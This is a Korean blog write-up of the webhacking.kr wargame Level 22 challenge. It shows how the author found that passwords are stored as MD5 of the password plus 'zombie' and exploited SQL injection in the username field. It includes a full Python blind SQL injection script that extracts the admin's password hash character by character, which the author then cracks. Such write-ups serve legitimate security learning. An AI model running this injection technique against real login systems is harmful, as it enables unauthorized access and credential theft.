---
layout: post
title:  "[Web.kr]Level 22"
subtitle:   "[Web.kr]Level 22"
categories: Write-up
tags:
- Wargame
- webhacking.kr(Old)
- Write-up
---

<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731213530251.png" width="400px">

```html
<form method=post action=index.php>
<table border=1 cellpadding=5 cellspacing=0>
<tr><td>username</td><td><input name=uuid type=text></td></tr>
<tr><td>password</td><td><input name=pw type=password></td></tr>
<tr align=center><td><input type=submit value='login'></td><td>
<input type=button value='join' onclick=location.href='?mode=join' style=width:100;></td></tr>
</form>
<p>
</table><br><br>
```



아이디와 비밀번호를 넣고 로그인과 회원가입하는 버튼이 존재한다.

힌트도 위 사진처럼 보여지고 있다.



소스코드를 보면 uuid와 pw가 POST방식으로 전달되는 것을 볼 수 있다.



회원가입을 통해 아이디를 만들고 로그인을 해보았다. (ttest / 1234)



<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731214938890.png" width="400px">

key값을 보아 특정 암호화가 이루어 지는것 같다.





<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731215327315.png" width="400px">

key값의 길이를 알아보니 32바이트였다.

32바이트 하면 떠오르는건 MD5 해시뿐이였다.





<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731215259261.png" width="500px">

예상대로 MD5였다. 복호화 문자는 '1234zombie' 였다. 즉, 비밀번호를 생성하면 비밀번호 뒤에 'zombie'를 붙이고 md5 해싱을 하여 key값으로 사용한다.

(지금 write-up쓰면서 생각해보니, '1234zombie' 라는 md5값이 서버에 있는게 신기방기😂)



이제 'admin'의 키 값만 구하면, pw를 구할 수 있을 것 같다.

그럼 'admin'의 키 값은 어떻게 구하지?



<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731220217394.png" width="500px">



admin으로 회원가입하기 위해 우회도 해보고 다해봤지만 안되서 아이디 부분에 SQL Injection을 하다보니

위와 같은 에러가 나왔다. 쿼리가 깨진것 같았다.



<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731220343620.png" width="200px">

그래서 주석을 '--' 대신 '#'을 사용 하였더니 위와 같이 출력되었다.

즉, username 부분은 SQL Injection을 성공한 한 것이다.



이제 비밀번호만 찾으면 되니 Blind Injection을 하면 될 것 같다.

```python
import urllib.request
import http.client
import re
import requests

if __name__=="__main__":

    pw =""
    md5 = [num for num in range(48,58)]+[num for num in range(97,104)]

    for i in range(1,33):
        for j in md5:
            data = {"uuid":"admin' and ord(substr(pw,"+str(i)+",1))="+str(j)+"#"}
            data = urllib.parse.urlencode(data)
            header = {"Content-type":"application/x-www-form-urlencoded","Accept": "text/plain","Cookie":"PHPSESSID=[세션 값]"}
            connection = http.client.HTTPConnection("webhacking.kr")
            connection.request("POST","/challenge/bonus/bonus-2/index.php",data,header)
            response = connection.getresponse()
            read = response.read()
            read =read.decode('utf-8')
            print("Parsing : "+chr(j))
            find = re.findall("Wrong password!",read)
            if find:
                pw += chr(j)
                print("[-] Find : "+pw)
                break
    print("[+] password : "+pw)
```



<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180801000450015.png" width="400px">

파싱을 통해 md5값을 추출해 냈다.





<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731235148792.png? width="400px">



MD5 Decrypt 사이트에 넣었더니 'rainbowzombie' 라는 값이 나왔다.

따라서 admin의 pw는 'rainbow'가 된다.



<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731235245302.png" width="300px">



<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731235307383.png" width="400px">